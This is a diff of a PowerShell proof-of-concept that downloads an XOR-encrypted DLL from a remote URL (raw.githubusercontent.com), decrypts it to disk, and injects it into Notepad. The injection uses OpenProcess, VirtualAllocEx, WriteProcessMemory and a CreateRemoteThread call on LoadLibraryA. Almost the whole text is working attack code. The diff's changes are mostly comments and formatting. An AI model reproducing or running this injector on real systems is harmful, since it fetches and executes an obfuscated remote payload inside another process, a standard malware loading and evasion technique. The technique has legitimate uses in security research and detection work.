@@ -1,8 +1,8 @@
 <#
 LoadLibrary Injection POC
 — Targets Notepad
-— Downloads an XOR’d DLL and drops it to disk
-— Calls LoadLibraryA remotely in Notepad
+— Downloads an XOR’d DLL directly via raw.githubusercontent.com
+— Drops it to disk and calls LoadLibraryA remotely in Notepad
 #>
 
 #Requires -Version 3.0
@@ -40,8 +40,8 @@ function Get-NotepadPID {
 }
 
 try {
-    # 1) Download & decrypt the DLL
-    Write-Host "[~] Downloading encrypted DLL..."
+    # 1) Download & decrypt the DLL directly from raw.githubusercontent.com
+    Write-Host "[~] Downloading encrypted DLL from $DLL_URL..."
     $enc = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
     $buf = [byte[]]::new($enc.Length)
     for ($i = 0; $i -lt $enc.Length; $i++) {
@@ -49,14 +49,16 @@ try {
     }
 
     # 2) Write decrypted DLL to disk
-    Write-Host "[~] Writing DLL to $DLL_PATH"
+    Write-Host "[~] Writing decrypted DLL to $DLL_PATH"
     [IO.File]::WriteAllBytes($DLL_PATH, $buf)
 
-    # 3) Get Notepad PID & open process
+    # 3) Get Notepad PID & open process handle
     $targetPID = Get-NotepadPID
     Write-Host "[+] Target Notepad PID: $targetPID"
     $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $targetPID)
-    if ($hProc -eq [IntPtr]::Zero) { throw "OpenProcess failed (insufficient rights?)" }
+    if ($hProc -eq [IntPtr]::Zero) {
+        throw "OpenProcess failed (insufficient rights?)"
+    }
 
     try {
         # 4) Allocate memory for the DLL path string
@@ -66,24 +68,28 @@ try {
         $remoteStr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $len, 0x3000, 0x04)
         if ($remoteStr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }
 
-        # 5) Write the path string
+        # 5) Write the path string into target memory
         Write-Host "[~] Writing path string..."
         $written = [IntPtr]::Zero
         $ok = [Win32]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, $len, [ref]$written)
-        if (-not $ok -or $written -ne $len) { throw "WriteProcessMemory failed" }
+        if (-not $ok -or $written -ne $len) {
+            throw "WriteProcessMemory failed"
+        }
 
-        # 6) Lookup LoadLibraryA
+        # 6) Lookup LoadLibraryA address
         $hKernel = [Win32]::GetModuleHandle("kernel32.dll")
         $addrLL  = [Win32]::GetProcAddress($hKernel, "LoadLibraryA")
         Write-Host "[+] LoadLibraryA @ 0x{0:X}" -f $addrLL.ToInt64()
 
-        # 7) Create remote thread
+        # 7) Spawn the remote thread
         Write-Host "[~] Creating remote thread..."
         $tid = [IntPtr]::Zero
         $hth = [Win32]::CreateRemoteThread(
             $hProc, [IntPtr]::Zero, 0, $addrLL, $remoteStr, 0, [ref]$tid
         )
-        if ($hth -eq [IntPtr]::Zero) { throw "CreateRemoteThread failed" }
+        if ($hth -eq [IntPtr]::Zero) {
+            throw "CreateRemoteThread failed"
+        }
         Write-Host "[+] Injection succeeded! Thread ID: $tid"
         [Win32]::CloseHandle($hth) | Out-Null
 
